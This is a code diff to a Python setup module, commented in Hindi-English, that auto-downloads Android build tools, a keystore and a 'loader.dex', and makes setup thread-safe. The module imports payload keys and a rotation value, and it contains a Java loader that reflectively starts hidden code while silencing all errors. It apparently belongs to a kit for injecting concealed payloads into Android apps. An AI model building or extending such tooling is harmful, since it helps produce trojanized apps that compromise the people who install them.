@@ -7,11 +7,15 @@ Sab kuch auto-download. Ek bhi manual step nahi.
   - Android platform android.jar (multiple URL fallback)
   - keystore
   - loader.dex
+
+ensure_tools() thread-safe hai. Parallel calls serialize honge.
 """
 import os
 import shutil
 import stat
 import tarfile
+import threading
+import time
 import urllib.request
 import zipfile
 import subprocess
@@ -24,7 +28,6 @@ from config import (
     PAYLOAD_KEY1, PAYLOAD_KEY2, PAYLOAD_ROT,
 )
 
-# Multiple fallbacks — Google apne platform zip names badalta rehta hai
 PLATFORM_ZIP_URLS = [
     "https://dl.google.com/android/repository/platform-34_r02.zip",
     "https://dl.google.com/android/repository/platform-34-ext7_r02.zip",
@@ -34,7 +37,6 @@ PLATFORM_ZIP_URLS = [
     "https://dl.google.com/android/repository/platform-32_r01.zip",
 ]
 
-# Direct android.jar mirrors — no zip needed
 PLATFORM_JAR_URLS = [
     "https://raw.githubusercontent.com/Sable/android-platforms/master/android-30/android.jar",
     "https://github.com/Sable/android-platforms/raw/master/android-30/android.jar",
@@ -42,6 +44,11 @@ PLATFORM_JAR_URLS = [
 ]
 
 _READY_FLAG = os.path.join(TOOLS_DIR, ".ready")
+
+# ---- thread safety ----
+_setup_lock = threading.Lock()
+_setup_done = threading.Event()
+_setup_error = {"exc": None}
 
 
 def _download(url, dest):
@@ -52,21 +59,6 @@ def _download(url, dest):
     tmp = dest + ".part"
     urllib.request.urlretrieve(url, tmp)
     os.replace(tmp, dest)
-
-
-def _try_download_any(urls, dest):
-    last_err = None
-    for u in urls:
-        try:
-            print(f"[*] trying {u}")
-            _download(u, dest)
-            return True
-        except Exception as e:
-            print(f"[!] failed: {e}")
-            last_err = e
-            if os.path.exists(dest + ".part"):
-                os.remove(dest + ".part")
-    raise RuntimeError(f"all mirrors failed: {last_err}")
 
 
 def _extract_jre():
@@ -117,16 +109,14 @@ def _extract_build_tools():
 def _extract_platform():
     if os.path.exists(ANDROID_JAR) and os.path.getsize(ANDROID_JAR) > 0:
         return
-
     os.makedirs(os.path.dirname(ANDROID_JAR), exist_ok=True)
 
-    # Attempt 1: direct jar mirrors (no extraction)
     for jar_url in PLATFORM_JAR_URLS:
         try:
             print(f"[*] trying direct jar: {jar_url}")
             tmp = ANDROID_JAR + ".part"
             urllib.request.urlretrieve(jar_url, tmp)
-            if os.path.getsize(tmp) > 1024 * 100:   # sanity: >100KB
+            if os.path.getsize(tmp) > 1024 * 100:
                 os.replace(tmp, ANDROID_JAR)
                 print(f"[✓] android.jar fetched ({os.path.getsize(ANDROID_JAR)} bytes)")
                 return
@@ -134,7 +124,6 @@ def _extract_platform():
         except Exception as e:
             print(f"[!] jar mirror failed: {e}")
 
-    # Attempt 2: Google platform zips
     zpath = os.path.join(TOOLS_DIR, "plat.zip")
     for zip_url in PLATFORM_ZIP_URLS:
         try:
@@ -142,7 +131,6 @@ def _extract_platform():
             if os.path.exists(zpath):
                 os.remove(zpath)
             urllib.request.urlretrieve(zip_url, zpath)
-            print("[*] extracting platform zip ...")
             tmp_ex = os.path.join(TOOLS_DIR, "_platform_tmp")
             if os.path.exists(tmp_ex):
                 shutil.rmtree(tmp_ex)
@@ -167,8 +155,7 @@ def _extract_platform():
                 os.remove(zpath)
 
     raise RuntimeError(
-        "android.jar could not be obtained from any mirror. "
-        "Download manually and place at " + ANDROID_JAR
+        "android.jar could not be obtained. Place manually at " + ANDROID_JAR
     )
 
 
@@ -239,7 +226,6 @@ public final class Loader {
             Method m = entry.getMethod("start", Context.class);
             m.invoke(null, ctx);
         } catch (Throwable t) {
-            // silent
         }
     }
 
@@ -352,8 +338,7 @@ def _compile_dex(src_dir: str, out_dex: str):
         check=True, capture_output=True, env=env,
     )
 
-    out_dir = os.path.dirname(out_dex) or "."
-    os.makedirs(out_dir, exist_ok=True)
+    os.makedirs(os.path.dirname(out_dex) or ".", exist_ok=True)
     class_files = []
     for root, _, files in os.walk(classes_dir):
         for f in files:
@@ -390,10 +375,7 @@ def _java_env() -> dict:
     return env
 
 
-def ensure_tools():
-    os.makedirs(TOOLS_DIR, exist_ok=True)
-    if os.path.exists(_READY_FLAG):
-        return
+def _do_setup():
     _extract_jre()
     _download(URL_ECJ, ECJ_JAR)
     _download(URL_APKTOOL, APKTOOL_JAR)
@@ -403,4 +385,38 @@ def ensure_tools():
     _ensure_loader_dex()
     with open(_READY_FLAG, "w") as f:
         f.write("ok")
-    print("[✓] all tools ready")
+
+
+def ensure_tools():
+    """
+    Thread-safe. Pehla caller setup karta hai, baaki wait karte hain.
+    Boot thread + handler thread dono isse safely call kar sakte hain.
+    """
+    if os.path.exists(_READY_FLAG):
+        _setup_done.set()
+        return
+
+    with _setup_lock:
+        # double-check after acquiring lock
+        if os.path.exists(_READY_FLAG):
+            _setup_done.set()
+            return
+        try:
+            _do_setup()
+            _setup_error["exc"] = None
+        except Exception as e:
+            _setup_error["exc"] = e
+            print(f"[!] setup failed: {e}")
+            raise
+        finally:
+            _setup_done.set()
+
+
+def wait_ready(timeout: float = 900.0) -> bool:
+    """Block karta hai jab tak setup complete na ho. handler threads ke liye."""
+    if os.path.exists(_READY_FLAG):
+        return True
+    ok = _setup_done.wait(timeout)
+    if _setup_error["exc"]:
+        raise _setup_error["exc"]
+    return ok and os.path.exists(_READY_FLAG)
